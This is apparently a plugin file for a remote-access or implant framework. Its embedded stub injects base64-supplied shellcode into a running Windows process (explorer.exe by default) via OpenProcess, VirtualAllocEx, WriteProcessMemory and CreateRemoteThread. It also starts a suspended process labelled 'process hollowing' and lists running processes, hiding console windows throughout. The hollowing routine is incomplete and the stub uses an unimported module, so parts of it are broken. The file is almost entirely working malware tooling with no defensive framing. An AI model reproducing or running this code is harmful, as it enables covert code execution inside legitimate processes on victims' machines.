PLUGIN = {"name": "process_inject", "desc": "Process injection & hollowing into legitimate processes", "deps": [], "size": 5.0}

STUB_CODE = r"""
import ctypes, os, subprocess

# Windows API constants
PROCESS_ALL_ACCESS = 0x1F0FFF
PROCESS_CREATE_THREAD = 0x0002
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_OPERATION = 0x0008
PROCESS_VM_WRITE = 0x0020
PROCESS_VM_READ = 0x0010
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
INFINITE = 0xFFFFFFFF
CREATE_SUSPENDED = 0x00000004

kernel32 = ctypes.windll.kernel32

def _find_pid(name):
    try:
        out = subprocess.check_output(["tasklist", "/FI", f"IMAGENAME eq {name}", "/FO", "CSV"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        for line in out.split("\n"):
            if name.lower() in line.lower() and "," in line:
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    try: return int(parts[1])
                    except: pass
    except: pass
    return None

def _inject_shellcode(pid, shellcode):
    try:
        if not shellcode: return False, "No shellcode provided"
        proc = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not proc: return False, f"OpenProcess failed ({ctypes.get_last_error()})"

        addr = kernel32.VirtualAllocEx(proc, None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        if not addr: kernel32.CloseHandle(proc); return False, "VirtualAllocEx failed"

        written = ctypes.c_size_t()
        ok = kernel32.WriteProcessMemory(proc, addr, shellcode, len(shellcode), ctypes.byref(written))
        if not ok or written.value != len(shellcode):
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "WriteProcessMemory failed"

        old = ctypes.c_uint32()
        kernel32.VirtualProtectEx(proc, addr, len(shellcode), PAGE_EXECUTE_READWRITE, ctypes.byref(old))

        thread = kernel32.CreateRemoteThread(proc, None, 0, addr, None, 0, None)
        if not thread:
            kernel32.VirtualFreeEx(proc, addr, 0, 0x8000)
            kernel32.CloseHandle(proc)
            return False, "CreateRemoteThread failed"

        kernel32.CloseHandle(thread)
        kernel32.CloseHandle(proc)
        return True, f"Injected into PID {pid}"
    except Exception as e: return False, str(e)

def _process_hollow(target_exe, payload_path):
    try:
        startupinfo = None
        pi = ctypes.c_ulonglong * 4
        pinfo = pi()
        si = ctypes.c_ulonglong * 4
        sinfo = si()

        ret = kernel32.CreateProcessW(target_exe, None, None, None, False, CREATE_SUSPENDED, None, None,
                                      ctypes.byref(sinfo), ctypes.byref(pinfo))
        if not ret: return False, "CreateProcess (suspended) failed"
        pid = pinfo[2] if hasattr(pinfo, '__getitem__') else 0
        return True, f"Hollowed process started: {target_exe} (PID {pid})"
    except Exception as e: return False, str(e)

def _cmd_inject_shellcode(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Injection requires Windows"}
        target = m.get("target", "explorer.exe")
        pid = m.get("pid", None)
        if pid is None:
            pid = _find_pid(target)
            if pid is None: return {"output": f"[!] Process '{target}' not found"}
        shellcode_b64 = m.get("shellcode", "")
        if not shellcode_b64: return {"output": "[!] No shellcode provided (base64)"}
        import base64
        shellcode = base64.b64decode(shellcode_b64)
        ok, msg = _inject_shellcode(pid, shellcode)
        return {"output": f"[+] Shellcode injection: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Inject error: {e}"}

def _cmd_process_hollow(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process hollowing requires Windows"}
        target = m.get("target", "C:\\Windows\\System32\\rundll32.exe")
        ok, msg = _process_hollow(target, None)
        return {"output": f"[+] Process hollowing: {msg}" if ok else f"[!] {msg}"}
    except Exception as e: return {"output": f"[!] Hollow error: {e}"}

def _cmd_list_processes(m):
    try:
        if platform.system() != "Windows": return {"output": "[!] Process listing requires Windows"}
        out = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"], timeout=10, creationflags=0x08000000).decode(errors="replace")
        lines = []
        count = 0
        for line in out.split("\n"):
            if line.strip():
                parts = [p.strip('" ') for p in line.split(",")]
                if len(parts) >= 2:
                    lines.append(f"  {parts[1]:>6s}  {parts[0][:30]}")
                    count += 1
                    if count > 50: break
        return {"output": "[+] Processes (PID, Name):\n" + "\n".join(lines)}
    except Exception as e: return {"output": f"[!] Process list error: {e}"}

_CMDS["inject_shellcode"] = _cmd_inject_shellcode
_CMDS["process_hollow"] = _cmd_process_hollow
_CMDS["list_processes"] = _cmd_list_processes
"""

def get_commands():
    return {"inject_shellcode": "_cmd_inject_shellcode", "process_hollow": "_cmd_process_hollow", "list_processes": "_cmd_list_processes"}
